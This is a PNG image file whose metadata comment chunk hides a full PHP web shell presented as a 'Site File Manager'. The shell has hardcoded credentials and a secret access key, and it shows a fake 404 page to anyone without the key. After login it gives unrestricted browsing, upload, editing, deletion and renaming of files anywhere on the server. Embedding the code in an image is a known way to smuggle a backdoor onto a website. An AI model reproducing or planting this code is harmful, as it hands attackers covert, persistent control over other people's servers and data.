�PNG

���
IHDR����������wS���6iTXtComment�����'<?php
$USERNAME = "admin";
$PASSWORD = "Admin@123456";
$ACCESS_KEY = "site_manager_2026";

session_start();

if(!isset($_GET['key']) || $_GET['key'] !== $ACCESS_KEY){
    http_response_code(404);
    exit("404 Not Found");
}

if(isset($_POST['username']) && isset($_POST['password'])){
    if($_POST['username'] === $USERNAME && $_POST['password'] === $PASSWORD){
        $_SESSION['login'] = true;
    }else{
        $error = "Invalid username or password";
    }
}

if(!isset($_SESSION['login'])){
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Site File Manager</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">

<div class="container mt-5" style="max-width:400px;">
<div class="card shadow">
<div class="card-header text-center">
<strong>Site File Manager</strong>
</div>
<div class="card-body">

<form method="post">
<div class="mb-3">
<input class="form-control" type="text" name="username" placeholder="Username">
</div>
<div class="mb-3">
<input class="form-control" type="password" name="password" placeholder="Password">
</div>

<button class="btn btn-primary w-100">Login</button>
</form>

<?php if(isset($error)) echo "<div class='text-danger mt-2'>$error</div>";?>

</div>
</div>
</div>

</body>
</html>

<?php exit; }

error_reporting(0);

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);

function formatSize($size){
    $units = ['B','KB','MB','GB','TB'];
    for($i=0;$size>1024;$i++){
        $size/=1024;
    }
    return round($size,2).$units[$i];
}

if(isset($_GET['logout'])){
    session_destroy();
    header("Location:?key=".$_GET['key']);
}

if(isset($_POST['save'])){
    file_put_contents($_POST['file'], $_POST['content']);
}

if(isset($_GET['delete'])){
    $f = $_GET['delete'];
    is_dir($f) ? rmdir($f) : unlink($f);
    header("Location:?key=".$_GET['key']."&path=".dirname($f));
}

if(isset($_POST['upload'])){
    move_uploaded_file($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name']);
}

if(isset($_POST['newfile'])){
    file_put_contents($path.'/'.$_POST['filename'], '');
}

if(isset($_POST['newfolder'])){
    mkdir($path.'/'.$_POST['foldername']);
}

if(isset($_POST['rename'])){
    rename($_POST['old'], $_POST['new']);
}

?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>File Manager</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">

<div class="container-fluid mt-3">

<div class="d-flex justify-content-between mb-3">
<h4>Site File Manager</h4>
<a class="btn btn-sm btn-danger" href="?key=<?php echo $_GET['key'];?>&logout=1">Logout</a>
</div>

<div class="card mb-3">
<div class="card-body">
<strong>Current Path:</strong> <?php echo $path;?>
</div>
</div>

<div class="row mb-3">

<div class="col-md-4">
<form method="post" enctype="multipart/form-data">
<input class="form-control mb-2" type="file" name="file">
<button class="btn btn-primary btn-sm" name="upload">Upload</button>
</form>
</div>

<div class="col-md-4">
<form method="post">
<input class="form-control mb-2" type="text" name="filename" placeholder="New File">
<button class="btn btn-success btn-sm" name="newfile">Create File</button>
</form>
</div>

<div class="col-md-4">
<form method="post">
<input class="form-control mb-2" type="text" name="foldername" placeholder="New Folder">
<button class="btn btn-secondary btn-sm" name="newfolder">Create Folder</button>
</form>
</div>

</div>

<table class="table table-bordered table-hover bg-white">
<thead class="table-light">
<tr>
<th>Name</th>
<th>Size</th>
<th>Action</th>
</tr>
</thead>
<tbody>

<?php

if($path != dirname($path)){
    echo "<tr><td colspan=3><a href='?key=".$_GET['key']."&path=".dirname($path)."'>⬅ Back</a></td></tr>";
}

foreach(scandir($path) as $file){

if($file=='.'||$file=='..') continue;

$full=$path.'/'.$file;

echo "<tr>";

if(is_dir($full)){
    echo "<td>📁 <a href='?key=".$_GET['key']."&path=$full'>$file</a></td>";
}else{
    echo "<td>$file</td>";
}

echo "<td>".(is_file($full)?formatSize(filesize($full)):'-')."</td>";

echo "<td>";

if(is_file($full)){
 echo "<a class='btn btn-sm btn-primary' href='?key=".$_GET['key']."&edit=$full'>Edit</a> ";
}

echo "<a class='btn btn-sm btn-danger' href='?key=".$_GET['key']."&delete=$full'>Delete</a> ";

echo "<a class='btn btn-sm btn-warning' href='?key=".$_GET['key']."&rename=$full'>Rename</a>";

echo "</td>";

echo "</tr>";
}

?>

</tbody>
</table>

<?php

if(isset($_GET['edit'])){

$file=$_GET['edit'];
$content=htmlspecialchars(file_get_contents($file));

echo "
<div class='card mt-3'>
<div class='card-header'>Edit File</div>
<div class='card-body'>
<form method='post'>
<input type='hidden' name='file' value='$file'>
<textarea class='form-control' name='content' style='height:400px;'>$content</textarea>
<br>
<button class='btn btn-success' name='save'>Save</button>
</form>
</div>
</div>
";

}

if(isset($_GET['rename'])){

$file=$_GET['rename'];

echo "
<div class='card mt-3'>
<div class='card-header'>Rename</div>
<div class='card-body'>
<form method='post'>
<input type='hidden' name='old' value='$file'>
<input class='form-control mb-2' name='new' value='$file'>
<button class='btn btn-warning' name='rename'>Rename</button>
</form>
</div>
</div>
";

}

?>

</div>

</body>
</html>'	{6y���IDATx����w��F[��������IEND�B`�